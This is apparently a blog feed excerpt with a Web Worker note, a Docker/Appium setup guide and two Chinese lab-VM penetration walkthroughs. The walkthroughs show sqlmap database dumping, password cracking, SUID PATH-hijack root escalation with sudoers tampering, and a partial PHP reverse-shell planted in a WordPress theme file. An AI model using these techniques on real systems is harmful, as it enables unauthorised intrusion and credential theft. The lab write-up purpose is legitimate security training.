总结</h3><blockquote><p>代码勒就这么多，难度不大，</p><p>但是我做的时候碰到一个问题：</p><p><strong>我之前做的是在<code>getExcelInfo</code>函数下直接把<code>XLSX</code>读到的数据全部返回给主线程，</strong></p><p><strong>读表格的时候还挺好，读完了界面直接卡死！！！</strong></p><p>原因就是读到的数据太大了，<code>postMessage</code>的时候卡死了</p><p>所以像<code>Worker</code>这个东西，还是内部处理好大数据量的所有事情，就返回一个状态标记之类的东西给主线程就好了</p><p>思考：</p><p>​那如果需要读一个大表格然后展示到页面上使用<code>Worker</code>怎么做呢，欢迎留下你的思路~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> front-end </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker搭建appium</title>
      <link href="/docker-appium/"/>
      <url>/docker-appium/</url>
      
        <content type="html"><![CDATA[<h1 id="使用docker搭建appium"><a href="#使用docker搭建appium" class="headerlink" title="使用docker搭建appium"></a>使用docker搭建appium</h1><h2 id="1-docker-appium镜像和命令"><a href="#1-docker-appium镜像和命令" class="headerlink" title="1.docker appium镜像和命令"></a>1.docker appium镜像和命令</h2><ul><li>见详细文档：<a href="https://github.com/appium/appium-docker-android">https://github.com/appium/appium-docker-android</a></li></ul><h2 id="2-docker启动appium"><a href="#2-docker启动appium" class="headerlink" title="2.docker启动appium"></a>2.docker启动appium</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">--privileged</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">4723</span>:4723 <span class="token parameter variable">-v</span> ~/.android:/root/.android <span class="token parameter variable">-v</span> /dev/bus/usb:/dev/bus/usb <span class="token parameter variable">--name</span> appium appium/appium<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-docker-appium连接设备"><a href="#3-docker-appium连接设备" class="headerlink" title="3.docker appium连接设备"></a>3.docker appium连接设备</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb devices   <span class="token comment"># 查看windows连接设备</span>adb connect <span class="token number">127.0</span>.0.1:62001   <span class="token comment"># 手动连接设备</span>adb <span class="token parameter variable">-s</span> <span class="token number">127.0</span>.0.1:62001 tcpip <span class="token number">5555</span><span class="token punctuation">(</span>自己设置的端口号<span class="token punctuation">)</span>   <span class="token comment"># 更改连接方式</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb devices   <span class="token comment"># 查看连接设备</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb connect <span class="token number">127.17</span>.100.15<span class="token punctuation">(</span>模拟器ip<span class="token punctuation">)</span>:5555<span class="token punctuation">(</span>端口<span class="token punctuation">)</span>   <span class="token comment"># 手动连接设备</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-开启多个appium容器并连接"><a href="#4-开启多个appium容器并连接" class="headerlink" title="4.开启多个appium容器并连接"></a>4.开启多个appium容器并连接</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 换一下端口就可以</span><span class="token function">docker</span> run <span class="token parameter variable">--privileged</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">4723</span>:4723 <span class="token parameter variable">-v</span> ~/.android:/root/.android <span class="token parameter variable">-v</span> /dev/bus/usb:/dev/bus/usb <span class="token parameter variable">--name</span> appium1 appium/appium<span class="token function">docker</span> run <span class="token parameter variable">--privileged</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">4724</span>:4723 <span class="token parameter variable">-v</span> ~/.android:/root/.android <span class="token parameter variable">-v</span> /dev/bus/usb:/dev/bus/usb <span class="token parameter variable">--name</span> appium2 appium/appium<span class="token function">docker</span> run <span class="token parameter variable">--privileged</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">4725</span>:4723 <span class="token parameter variable">-v</span> ~/.android:/root/.android <span class="token parameter variable">-v</span> /dev/bus/usb:/dev/bus/usb <span class="token parameter variable">--name</span> appium3 appium/appium<span class="token comment"># 分别连接多个设备</span>adb <span class="token parameter variable">-s</span> <span class="token number">127.0</span>.0.1:62001 tcpip <span class="token number">5555</span><span class="token punctuation">(</span>自己设置的端口号<span class="token punctuation">)</span>   <span class="token comment"># 更改连接方式</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb devices   <span class="token comment"># 查看连接设备</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb connect <span class="token number">192.168</span>.31.158<span class="token punctuation">(</span>模拟器ip<span class="token punctuation">)</span>:5555<span class="token punctuation">(</span>端口<span class="token punctuation">)</span> adb <span class="token parameter variable">-s</span> <span class="token number">127.0</span>.0.1:62025 tcpip <span class="token number">5555</span><span class="token punctuation">(</span>自己设置的端口号<span class="token punctuation">)</span>   <span class="token comment"># 更改连接方式</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb devices   <span class="token comment"># 查看连接设备</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb connect <span class="token number">192.168</span>.31.173<span class="token punctuation">(</span>模拟器ip<span class="token punctuation">)</span>:5555<span class="token punctuation">(</span>端口<span class="token punctuation">)</span> adb <span class="token parameter variable">-s</span> <span class="token number">127.0</span>.0.1:62026 tcpip <span class="token number">5555</span><span class="token punctuation">(</span>自己设置的端口号<span class="token punctuation">)</span>   <span class="token comment"># 更改连接方式</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb devices   <span class="token comment"># 查看连接设备</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> appium adb connect <span class="token number">192.168</span>.31.174<span class="token punctuation">(</span>模拟器ip<span class="token punctuation">)</span>:5555<span class="token punctuation">(</span>端口<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-python接口配置"><a href="#5-python接口配置" class="headerlink" title="5. python接口配置"></a>5. python接口配置</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> appium <span class="token keyword">import</span> webdriver desired_caps <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>desired_caps<span class="token punctuation">[</span><span class="token string">'platformName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Android'</span>desired_caps<span class="token punctuation">[</span><span class="token string">'deviceName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'192.168.31.158(夜神模拟器ip):5555(tcpip转换的端口)'</span><span class="token comment"># desired_caps['deviceName'] = '127.0.0.1:62001'  # 夜神模拟器</span><span class="token comment"># self.desired_caps['deviceName'] = 'MXF5T15C24001273'  # 华为手机</span>desired_caps<span class="token punctuation">[</span><span class="token string">'platformVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'5.1.1'</span>  <span class="token comment"># 夜神模拟器</span><span class="token comment"># self.desired_caps['platformVersion'] = '6.0'  # 华为手机</span>desired_caps<span class="token punctuation">[</span><span class="token string">'appPackage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'cn.rongcloud.kaixinliao'</span> <span class="token comment"># 包名</span>desired_caps<span class="token punctuation">[</span><span class="token string">'appActivity'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'cn.rongcloud.kaixinliao.ui.activity.SplashActivity'</span>desired_caps<span class="token punctuation">[</span><span class="token string">'noReset'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>desired_caps<span class="token punctuation">[</span><span class="token string">'unicodeKeyboard'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>desired_caps<span class="token punctuation">[</span><span class="token string">'resetKeyboard'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span> driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Remote<span class="token punctuation">(</span><span class="token string">'http://192.168.31.111(服务器ip):4723(appium映射的端口号)/wd/hub'</span><span class="token punctuation">,</span> desired_caps<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> appium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“NullByte”靶机渗透</title>
      <link href="/nullbyte/"/>
      <url>/nullbyte/</url>
      
        <content type="html"><![CDATA[<h1 id="NullByte靶机渗透"><a href="#NullByte靶机渗透" class="headerlink" title="NullByte靶机渗透"></a>NullByte靶机渗透</h1><h2 id="0x01-环境信息"><a href="#0x01-环境信息" class="headerlink" title="0x01 环境信息"></a>0x01 环境信息</h2><ol><li><p>攻击机：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system: kali linux Ipaddress: <span class="token number">192.168</span>.0.21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>靶机：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system: 未知 Ipaddress: 未知（局域网内）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="0x02-渗透过程"><a href="#0x02-渗透过程" class="headerlink" title="0x02 渗透过程"></a>0x02 渗透过程</h2><ul><li><p>主机发现</p></li><li><p>使用初期扫描脚本扫描：</p></li><li><p>扫描结果<br><img src="/../static/nullbyte/image-20200512134810766.png" alt="image-20200512134810766"></p></li><li><p>可以得到：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iPaddress: <span class="token number">192.168</span>.0.113http: <span class="token number">80</span>  /phpmyadminrpcbind: <span class="token number">111</span>ssh: <span class="token number">777</span>system: Debian Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>先去看看web</p></li><li><p><a href="http://192.168.0.113/">http://192.168.0.113</a><br><img src="/../static/nullbyte/image-20200512135615706.png" alt="image-20200512135615706"></p></li><li><p>只有这么些东西，当然还有一个 <code>phpmyadmin</code> 也咩有密码啊</p></li><li><p>然后看看这个图片是不是有隐写</p></li><li><p>下载到kali里面</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">root@kali<span class="token operator">:</span><span class="token operator">~</span># exiftool main<span class="token punctuation">.</span>gifExifTool Version Number         <span class="token operator">:</span> <span class="token number">11.98</span>File Name                       <span class="token operator">:</span> main<span class="token punctuation">.</span>gif<span class="token literal-property property">Directory</span>                       <span class="token operator">:</span> <span class="token punctuation">.</span>File Size                       <span class="token operator">:</span> <span class="token number">16</span> kBFile Modification Date<span class="token operator">/</span>Time     <span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">:</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">12</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">45</span><span class="token operator">+</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span>File Access Date<span class="token operator">/</span>Time           <span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">:</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">12</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">45</span><span class="token operator">+</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span>File Inode Change Date<span class="token operator">/</span>Time     <span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">:</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">12</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">35</span><span class="token operator">:</span><span class="token number">22</span><span class="token operator">+</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span>File Permissions                <span class="token operator">:</span> rw<span class="token operator">-</span>r<span class="token operator">--</span>r<span class="token operator">--</span>File Type                       <span class="token operator">:</span> <span class="token constant">GIF</span>File Type Extension             <span class="token operator">:</span> gif<span class="token constant">MIME</span> <span class="token literal-property property">Type</span>                       <span class="token operator">:</span> image<span class="token operator">/</span>gif<span class="token constant">GIF</span> <span class="token literal-property property">Version</span>                     <span class="token operator">:</span> 89aImage Width                     <span class="token operator">:</span> <span class="token number">235</span>Image Height                    <span class="token operator">:</span> <span class="token number">302</span>Has Color Map                   <span class="token operator">:</span> NoColor Resolution Depth          <span class="token operator">:</span> <span class="token number">8</span>Bits Per Pixel                  <span class="token operator">:</span> <span class="token number">1</span>Background Color                <span class="token operator">:</span> <span class="token number">0</span><span class="token literal-property property">Comment</span>                         <span class="token operator">:</span> <span class="token constant">P</span><span class="token operator">-</span><span class="token punctuation">)</span><span class="token operator">:</span> kzMb5nVYJwImage Size                      <span class="token operator">:</span> 235x302<span class="token literal-property property">Megapixels</span>                      <span class="token operator">:</span> <span class="token number">0.071</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以看到 <code>Comment        : P-): kzMb5nVYJw</code></p></li><li><p><code>kzMb5nVYJw</code> 好像是密码?还是什么</p></li><li><p>试了一下<code>phpmyadmin</code>的密码没用啊</p></li><li><p>然后我又爆破了一下目录<br><img src="/../static/nullbyte/image-20200512145546435.png" alt="image-20200512145546435"></p></li><li><p>没啥有用的信息啊</p></li><li><p>看看是不是这个目录</p></li><li><p><a href="http://192.168.0.113/kzMb5nVYJw">http://192.168.0.113/kzMb5nVYJw</a></p></li><li><p>果然有，要我们输入key</p></li><li><p>试试SQL注入</p></li><li><p>先抓包<br><img src="/../static/nullbyte/image-20200512150308115.png" alt="image-20200512150308115"></p></li><li><p>再复制<code>copy to file</code> 保存为<code>sqlmap.txt</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> sqlmap.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>不存在SQL注入</p></li><li><p>那只能尝试爆破了<br><img src="/../static/nullbyte/image-20200512151542526.png" alt="image-20200512151542526"><br><img src="/../static/nullbyte/image-20200512151429648.png" alt="image-20200512151429648"></p></li><li><p>跑出来key是：<code>elite</code><br><img src="/../static/nullbyte/image-20200512151707333.png" alt="image-20200512151707333"></p></li><li><p>就看到搜索username的</p></li><li><p>再试试有没有sql注入</p></li><li><p>可以先用fuzz测试一下</p></li><li><p>抓个包<br><img src="/../static/nullbyte/image-20200512151959806.png" alt="image-20200512151959806"></p></li><li><p>然后<code>send to Intruder</code><br><img src="/../static/nullbyte/image-20200512152110694.png" alt="image-20200512152110694"></p></li><li><p>payload选<code>Fuzzing-SQL Injection</code>就可以</p></li><li><p>可以看到有些 会报sql语句的错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Could <span class="token operator">not</span> get <span class="token keyword">data</span>: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''</span><span class="token operator">%</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token operator">+</span><span class="token operator">%</span>"' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>然后就可以使用sqlmap跑了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--dbs</span>available databases <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>:<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema<span class="token punctuation">[</span>*<span class="token punctuation">]</span> mysql<span class="token punctuation">[</span>*<span class="token punctuation">]</span> performance_schema<span class="token punctuation">[</span>*<span class="token punctuation">]</span> phpmyadmin<span class="token punctuation">[</span>*<span class="token punctuation">]</span> sethsqlmap <span class="token parameter variable">-u</span> http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch<span class="token operator">=</span><span class="token number">1</span> --current-dbcurrent database:    <span class="token string">'seth'</span>sqlmap <span class="token parameter variable">-u</span> http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> seth <span class="token parameter variable">--tables</span>Database: seth<span class="token punctuation">[</span><span class="token number">1</span> table<span class="token punctuation">]</span>+-------+<span class="token operator">|</span> <span class="token function">users</span> <span class="token operator">|</span>+-------+sqlmap <span class="token parameter variable">-u</span> http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> seth <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--columns</span>Table: <span class="token function">users</span><span class="token punctuation">[</span><span class="token number">4</span> columns<span class="token punctuation">]</span>+----------+-------------+<span class="token operator">|</span> Column   <span class="token operator">|</span> Type        <span class="token operator">|</span>+----------+-------------+<span class="token operator">|</span> position <span class="token operator">|</span> text        <span class="token operator">|</span><span class="token operator">|</span> user     <span class="token operator">|</span> text        <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">id</span>       <span class="token operator">|</span> smallint<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> pass     <span class="token operator">|</span> text        <span class="token operator">|</span>+----------+-------------+sqlmap <span class="token parameter variable">-u</span> http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> seth <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">-C</span> user,pass <span class="token parameter variable">--dump</span>Database: sethTable: <span class="token function">users</span><span class="token punctuation">[</span><span class="token number">2</span> entries<span class="token punctuation">]</span>+--------+---------------------------------------------+<span class="token operator">|</span> user   <span class="token operator">|</span> pass                                        <span class="token operator">|</span>+--------+---------------------------------------------+<span class="token operator">|</span> ramses <span class="token operator">|</span> YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE <span class="token operator">|</span><span class="token operator">|</span> isis   <span class="token operator">|</span> <span class="token parameter variable">--not</span> allowed--                             <span class="token operator">|</span>+--------+---------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以知道一个账号密码</p></li><li><p>是不是ssh的账号密码呢？</p></li><li><p>先把密码破解出来</p></li><li><p>好像是一串base64</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~/workspace<span class="token comment"># echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" > b64</span>root@kali:~/workspace<span class="token comment"># base64 -d b64</span>c6d6bd7ebf806f43c76acc3681703b81 base64: 输入无效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>得到一串MD5 <code>c6d6bd7ebf806f43c76acc3681703b81</code></p></li><li><p>可以用john解密也可以到网上找</p></li><li><p>我用了下john没跑出来，用在线工具一下就出来了<br><img src="/../static/nullbyte/image-20200512154211755.png" alt="image-20200512154211755"></p></li><li><p>得到账号密码是：<code>ramses: omega</code></p></li><li><p>去试试ssh吧，记得端口是777<br><img src="/../static/nullbyte/image-20200512160325001.png" alt="image-20200512160325001"></p></li><li><p>就上了ssh了</p></li><li><p>想办法提权了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 先试试这这几个</span><span class="token function">sudo</span> <span class="token parameter variable">-l</span> <span class="token comment">#（无）</span><span class="token function">crontab</span> <span class="token parameter variable">-l</span><span class="token comment">#（无）</span><span class="token function">history</span><span class="token comment">#（无可用的）</span><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/var/www/backup/procwatch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>找到 <code>/var/www/backup/procwatch</code>文件为suid权限，先运行一下看看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ramses@NullByte:/var/www/backup$ ./procwatchPID TTY          TIME CMD<span class="token number">1451</span> pts/0    00:00:00 procwatch<span class="token number">1452</span> pts/0    00:00:00 <span class="token function">sh</span><span class="token number">1453</span> pts/0    00:00:00 <span class="token function">ps</span>ramses@NullByte:/var/www/backup$ <span class="token function">ps</span>PID TTY          TIME CMD<span class="token number">1361</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">1454</span> pts/0    00:00:00 <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>好像就执行了一个ps</p></li><li><p>我们可以试试偷天换日</p></li><li><p>先伪造一个ps命令，并让他找到这个ps</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 伪造ps命令：</span><span class="token builtin class-name">echo</span> <span class="token string">'/bin/sh'</span> <span class="token operator">></span> <span class="token function">ps</span><span class="token function">chmod</span> +x <span class="token function">ps</span><span class="token comment"># 使procwatch找到这个ps:</span><span class="token comment"># 先看看环境变量</span>ramses@NullByte:/var/www/backup$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games<span class="token comment"># 把当前文件夹的放到当前位置去，他就会先找当前目录下ps</span>ramses@NullByte:/var/www/backup$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>ramses@NullByte:/var/www/backup$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games<span class="token comment"># 执行procwatch</span>ramses@NullByte:/var/www/backup$ ./procwatch<span class="token comment"># cd /root</span>//说明已经是root权限了<span class="token comment"># ls</span>proof.txt// 可以直接给ramses root权限<span class="token builtin class-name">echo</span> <span class="token string">'ramsesALL=(ALL:ALL) ALL'</span> <span class="token operator">>></span> /etc/sudoers<span class="token builtin class-name">exit</span><span class="token function">sudo</span> <span class="token parameter variable">-i</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>就拿到了flag了~<br><img src="/../static/nullbyte/image-20200512164547103.png" alt="image-20200512164547103"></p></li><li><p>看到第一条有个hash值，解密就是<code>welldone22</code><br><img src="/../static/nullbyte/image-20200512162730802.png" alt="image-20200512162730802"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“懒惰的管理员”靶机渗透</title>
      <link href="/lazy/"/>
      <url>/lazy/</url>
      
        <content type="html"><![CDATA[<h1 id="“懒惰的管理员”靶机渗透"><a href="#“懒惰的管理员”靶机渗透" class="headerlink" title="“懒惰的管理员”靶机渗透"></a>“懒惰的管理员”靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><p>话不多少说开始搜集信息：</p></li><li><p>这里使用 <code>netdiscover </code> : <code>netdiscover -i eth0 -r 192.168.0.0/24</code></p></li><li><p>发现一条</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.0.110   00:0c:29:b8:5f:5f      <span class="token number">1</span>      <span class="token number">60</span>  VMware, Inc.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用nmap进一步探测端口 <code>nmap -sS 192.168.0.110 -oN /tmp/r.txt</code></p></li><li><p>扫描结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">994</span> closed portsPORT     STATE SERVICE<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span><span class="token number">80</span>/tcp   <span class="token function">open</span>  http<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds<span class="token number">3306</span>/tcp <span class="token function">open</span>  mysql<span class="token number">6667</span>/tcp <span class="token function">open</span>  ircMAC Address: 00:0C:29:B8:5F:5F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span class="token comment">#后来用 nmap -v -A 192.168.0.110 扫面出</span><span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span><span class="token number">445</span>/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">4.3</span>.11-Ubuntu <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>80肯定是web，139和445都是Samba</p></li><li><p>我们先用nikto 扫面一下web，再试试Samba能不能连接</p></li><li><p><code>nikto -host http://192.168.0.110/ -o /tmp/r.html</code></p></li><li><p>我用kali里面的连接网络文件夹输入 <code>smb://192.168.0.110</code></p></li><li><p>发现有两个文件夹一个是 <code>$print</code> 另一个是 <code>$share</code> 发现第一个需要密码，第二个可以匿名访问</p></li><li><p>进去看看，都是一代码</p></li><li><p>还找到一个文件 <code>deets.txt</code> 内容是</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CBF Remembering all these passwords.Remember to remove this <span class="token function">file</span> and update your password after we push out the server.Password <span class="token number">12345</span>CBF记住所有这些密码。请记住在我们推出服务器后删除此文件并更新您的密码。密码12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>发现一个服务器默认的密码 <code>12345</code></p></li><li><p>这时候我们在看nikto扫描的结果：</p></li><li><p>发现网站是<code>wordpress</code>框架，还有<code>phpmyadmin</code>的地址…</p></li><li><p>进到wordpress之后发现只有一篇文章，都是这句话<code>My name is togie.</code></p></li><li><p>这可能是某个用户名</p></li><li><p>这些相关的目录在<code>$share</code>都有那我们直接找<code>wordpress</code>的后台地址：<code>wp-admin</code></p></li><li><p>还在 <code>wp-config.php</code>找到了mysql的账号密码 <code>Admin ：TogieMYSQL12345^^</code></p></li><li><p>而且nikto还扫描到 <code>phpmyadmin</code>的地址，登进去看看，发现没有select权限，</p></li><li><p>那我们进去<code>wp-admin</code>看看也需要密码，咋办没密码呀，数据库也进不去，那就试试mysql的密码吧</p></li><li><p>发现mysql的密码竟然和 <code>wordpress</code>的账号密码是一样</p></li><li><p>进后台之后，查到可以修改主题的源代码，那我们就修改<code>404.php</code> 给了一个反弹shell的代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token string single-quoted-string">'192.168.0.21'</span><span class="token punctuation">;</span>    <span class="token variable">$port</span><span class="token operator">=</span><span class="token string single-quoted-string">'20096'</span><span class="token punctuation">;</span>    <span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$errno</span><span class="token punctuation">,</span><span class="token variable">$errstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\nconnect success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span 